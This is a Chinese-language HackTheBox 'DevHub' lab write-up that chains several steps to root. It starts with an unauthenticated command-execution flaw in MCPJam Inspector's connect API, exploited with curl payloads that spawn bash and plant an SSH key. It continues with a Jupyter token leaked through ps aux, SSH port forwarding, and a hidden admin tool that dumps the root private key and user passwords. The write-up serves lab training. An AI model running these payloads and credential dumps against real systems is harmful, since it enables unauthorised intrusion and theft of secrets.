# HTB DevHub Writeup

> **靶场**: HackTheBox DevHub | **难度**: Medium | **系统**: Ubuntu 22.04 LTS (kernel 5.15.0-179)
> **靶机 IP**: 10.129.5.14 | **VPS IP**: 10.10.16.214
>

---

## 概述

开放 22, 25, 80, 110, 143, 6274 六个端口。入口是 6274 上的 MCPJam Inspector v1.4.2，一个管 MCP Server 的 Web 面板。`/api/mcp/connect` 没认证没校验，直接拿用户传的 `command` + `args` 去 spawn，盲 RCE 拿到 mcp-dev Shell。翻 `ps aux` 发现 Jupyter 命令行里带着明文 Token，SSH 端口转发连上 JupyterLab 后以 analyst 身份拿到 user flag。最后翻 OPSMCP 源码看到硬编码 API Key 和 `ops._admin_dump` 隐藏端点，dump root 私钥直接 ssh root@127.0.0.1 提权。

攻击链: 6274 盲 RCE -> mcp-dev -> ps aux 泄露 Jupyter Token -> SSH -L 转发 -> JupyterLab (analyst) -> cat server.py -> ops._admin_dump dump root key -> ssh root@127.0.0.1

兔子洞:
- 25/110/143 邮件端口跑了一圈，POP3/IMAP 匿名登录不通，SMTP 没开放中继，纯干扰。
- websocket-client 直连 Jupyter WebSocket API，Windows 上 `ws.recv()` 老收不到输出，超时丢消息，折腾半天最后直接浏览器开 JupyterLab UI 反而稳了。

---

## 工具清单

| 工具 | 用途 |
|------|------|
| fscan | 全端口扫描 |
| nc | 反弹 Shell 监听 |
| ssh-keygen | 生成 SSH 密钥对 |
| openssh-client | SSH 登录 + 端口转发 |
| Python3 | Jupyter 交互、反弹 Shell |
| curl.exe | HTTP 请求 (PS 下必须显式 curl.exe 否则走 alias) |
| 浏览器 | JupyterLab UI 操作 |

---

## 攻击步骤

### 第一步：端口扫描

```bash
root@vps:~/DevHub# ./fscan -h 10.129.5.14 -p 1-65535 -nopoc

[3.0s] [*] 端口开放 10.129.5.14:22
[3.0s] [*] 端口开放 10.129.5.14:80
[3.0s] [*] 端口开放 10.129.5.14:25
[3.0s] [*] 端口开放 10.129.5.14:110
[3.0s] [*] 端口开放 10.129.5.14:143
[3.0s] [*] 端口开放 10.129.5.14:6274
[3.7s]     扫描完成, 发现 6 个开放端口
[3.7s]     存活端口数量: 6
[3.7s]     服务指纹:
[3.7s] [*] 10.129.5.14:22   OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
[3.7s] [*] 10.129.5.14:25   Postfix smtpd
[3.7s] [*] 10.129.5.14:80   nginx 1.18.0 (Ubuntu)
[3.7s] [*] 10.129.5.14:110  Dovecot pop3d
[3.7s] [*] 10.129.5.14:143  Dovecot imapd
[3.7s] [*] 10.129.5.14:6274 Open Lighting Architecture daemon
[10.8s] [*] 网站标题 http://10.129.5.14        状态码:302 长度:162    标题:302 Found 重定向地址: http://devhub.htb/
[10.8s] [*] 网站标题 http://10.129.5.14:6274   状态码:200 长度:1234   标题:MCPJam Inspector v1.4.2
```

fscan 把 6274 指纹标成 Open Lighting Architecture，但 fscan 最后一行的标题列已经出卖了它——`MCPJam Inspector v1.4.2`。原理是 fscan 指纹靠 banner + 端口号关键词匹配，6274 没特殊 banner 就按端口号误判了。全端口扫描不能只看自动识别，高端口必须逐个手工验证。

先看邮件端口，三个都试了：

```bash
root@vps:~/DevHub# telnet 10.129.5.14 25
Trying 10.129.5.14...
220 devhub.htb ESMTP Postfix (Ubuntu)
```

25 能连上，110 和 143 也能连，但三个端口匿名登录全不通，SMTP 也没开中继，纯兔子洞。

80 端口 302 到 devhub.htb，加 hosts 后浏览器打开首页看到三个服务卡片，确认 6274 是 active、8888 是 internal only。浏览器打开 `http://10.129.5.14:6274/` 看到 SPA 界面标题 MCPJam Inspector v1.4.2。页面底部写 "Ubuntu 24.04"，但后面进 SSH 跑 `uname -a` 是 kernel 5.15.0-179，实际上 Ubuntu 22.04 LTS。

---

### 第二步：6274 端口未授权 RCE

浏览器点 Connect 时抓包看到 POST `/api/mcp/connect`，body 里直接带着要启动进程的 `command`、`args`、`env`。后端直接用 `child_process.spawn()` 跑用户给的命令，没有认证也没有输入校验。

先随手发个 bash 确认能执行：

```bash
root@vps:~/DevHub# curl -X POST http://10.129.5.14:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id > /tmp/pwned"],
      "env": {}
    },
    "serverId": "evil"
  }'

{"error":"MCP error -32000: Connection closed"}
```

服务端返回 500 + MCP error。这个端点本意是连 MCP Server 进程用的，预期进程 stdout 输出的是 JSON-RPC 格式。换成 bash 后 stdout 变成了 shell 输出，服务端解析 JSON 失败就报错。但 `spawn()` 已经起了进程，`id > /tmp/pwned` 以 mcp-dev 身份在目标上跑完了——盲 RCE，命令执行了但 HTTP 响应里看不到输出。

接下来写 SSH 公钥。JSON 里特殊字符会炸，过一层 Base64：

```bash
root@vps:~/DevHub# ssh-keygen -t rsa -b 2048 -f loot/id_rsa_devhub

root@vps:~/DevHub# python3 -c "
import base64
cmd = \"mkdir -p ~/.ssh; echo '\$(cat loot/id_rsa_devhub.pub)' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys\"
print(base64.b64encode(cmd.encode()).decode())
"
```

payload 拿到了，发过去：

```bash
root@vps:~/DevHub# curl -X POST http://10.129.5.14:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","echo <BASE64_PAYLOAD> | base64 -d | bash"],"env":{}},"serverId":"ssh"}'
```

OK，SSH 进去：

```bash
root@vps:~/DevHub# ssh -i loot/id_rsa_devhub mcp-dev@10.129.5.14
mcp-dev@devhub:~$
```

> 踩坑：PowerShell 5.1 里 `curl` 是 `Invoke-WebRequest` alias，参数不兼容，得用 `curl.exe`。

---

### 第三步：内网侦察

进去先收信息，三板斧 `id` / `uname -a` / `ss -tlnp` / `ps aux`：

```bash
mcp-dev@devhub:~$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

mcp-dev@devhub:~$ uname -a
Linux devhub 5.15.0-179-generic #189-Ubuntu SMP ...

mcp-dev@devhub:~$ ss -tlnp
LISTEN  0  128  127.0.0.1:8888  *:*  users:(("python3",pid=1152,fd=5))
LISTEN  0  128  127.0.0.1:5000  *:*  users:(("python3",pid=1078,fd=4))
LISTEN  0  511  0.0.0.0:80      *:*  users:(("nginx",pid=892,fd=6))
LISTEN  0  128  0.0.0.0:22      *:*  users:(("sshd",pid=856,fd=3))
LISTEN  0  511  0.0.0.0:6274    *:*  users:(("node",pid=1281,fd=18))
```

`127.0.0.1:8888` 和 `127.0.0.1:5000` 是 localhost 绑定，外网直接访问不到，后面要用 SSH 端口转发。

然后看进程，这才是关键——Jupyter 和 OPSMCP 的命令行信息量很大：

```bash
mcp-dev@devhub:~$ ps aux | grep -E "jupyter|opsmcp|python"
analyst  1152  ...  /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab \
                     --ip=127.0.0.1 --port=8888 --no-browser \
                     --notebook-dir=/home/analyst/notebooks \
                     --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...

root     1078  ...  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Jupyter 的 `--ServerApp.token` 直接写在进程命令行里。Linux 下任何用户 `ps aux` 都能看到全系统进程的完整命令行，等于把密码贴在公告板上。所以拿到 Shell 第一件事就是 `ps aux`，比翻配置文件快得多。

OPSMCP 以 root 身份跑，代码路径 `/opt/opsmcp/server.py`，是个自定义 Flask 应用。

---

### 第四步：SSH 端口转发 + JupyterLab

新开一个终端连 SSH 转发（原来的 mcp-dev Shell 不用断）：

```bash
root@vps:~/DevHub# ssh -i loot/id_rsa_devhub -L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000 -N mcp-dev@10.129.5.14
```

`-L 8888:127.0.0.1:8888` 意思是 VPS 的 8888 通过 SSH 隧道打到靶机的 127.0.0.1:8888。`-N` 只要转发不跑命令，新终端相当于一个纯隧道。

浏览器打开 `http://localhost:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`，JupyterLab UI 完整加载。新建 Python 3 Notebook，在 cell 里跑：

```python
import subprocess
r = subprocess.run(['cat', '/home/analyst/user.txt'], capture_output=True, text=True)
print(r.stdout.strip())
```

user flag 在 `/home/analyst/user.txt`。

---

### 第五步：OPSMCP 源码审计

JupyterLab 当前身份是 analyst，能直接读自家目录下的 OPSMCP 代码。在 Notebook 里跑：

```python
import subprocess
r = subprocess.run(['cat', '/opt/opsmcp/server.py'], capture_output=True, text=True)
print(r.stdout)
```

源码拉出来，翻到核心部分：

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}
```

`HIDDEN_TOOLS` 里的 `ops._admin_dump` 以 `_` 开头，命名约定就是内部用的，不在公开的 tool list 里暴露。参数声明写了 `"target": "string"` 看起来随便传，但翻后面的代码体发现实际用 if/elif 只认三个：`ssh_keys`、`passwords`、`tokens`。源码审计的套路：先扫全局变量找密钥和连接串，再搜 `admin` / `debug` / `_internal` 命名。

---

### 第六步：OPSMCP 后门

端口转发一直开着，直接调 5000：

```bash
root@vps:~/DevHub# curl -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

{"root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA..."}
```

返回了 `/root/.ssh/id_rsa` 完整私钥。`target=passwords` 也试了，能捞出 mcp-dev 和 analyst 的明文密码，顺手记了下来。

---

### 第七步：Root flag

VPS（Windows）上直接用这个私钥 SSH root 坑了两次：`icacls` 搞不定权限、文件编码导致 `Load key: invalid format`。懒得折腾了，直接在靶机本地操作——mcp-dev 的 Shell 还在，从 localhost 调 OPSMCP API 拿 key 然后 ssh root@127.0.0.1：

```bash
mcp-dev@devhub:~$ python3 -c "
import json, urllib.request, os, subprocess
req = urllib.request.Request('http://localhost:5000/tools/call',
    data=json.dumps({'name':'ops._admin_dump','arguments':{'target':'ssh_keys','confirm':True}}).encode(),
    headers={'Content-Type':'application/json','X-API-Key':'opsmcp_secret_key_4f5a6b7c8d9e0f1a'})
key = json.loads(urllib.request.urlopen(req).read())['root_private_key']
with open('/tmp/rk','w') as f: f.write(key)
os.chmod('/tmp/rk',0o600)
r = subprocess.run(['ssh','-i','/tmp/rk','-o','StrictHostKeyChecking=no','root@127.0.0.1','cat /root/root.txt'], capture_output=True, text=True)
print(r.stdout.strip())
"

mcp-dev@devhub:~$ ssh -i /tmp/rk root@127.0.0.1
root@devhub:~# cat /root/root.txt
```

root flag 在 `/root/root.txt`。

> 坑：OpenSSH for Windows 对私钥权限要求极严（必须只有当前用户可读），PowerShell 配不好。以后碰到类似情况直接在靶机本地操作，一个 chmod 600 就过。

---

## 攻击树

```
10.129.5.14:6274 (MCPJam Inspector v1.4.2)
  │
  ├─ /api/mcp/connect 未认证 RCE (command+args 无校验)
  │   └─ mcp-dev Shell
  │       │
  │       ├─ 写 SSH authorized_keys (Base64 过 JSON)
  │       │
  │       ├─ ss -tlnp 发现 localhost:8888 & 5000
  │       ├─ ps aux 泄露 Jupyter Token
  │       │   └─ SSH -L 端口转发 -> JupyterLab
  │       │       └─ cat /home/analyst/user.txt
  │       │
  │       └─ cat /opt/opsmcp/server.py
  │           └─ 硬编码 API Key + ops._admin_dump 隐藏端点
  │               └─ dump root SSH key -> ssh root@127.0.0.1
  │                   └─ cat /root/root.txt
  │
  ├─ [兔子洞] 25/110/143 邮件端口: 匿名登录全不通
  └─ [备用] Python3 反弹 Shell
```
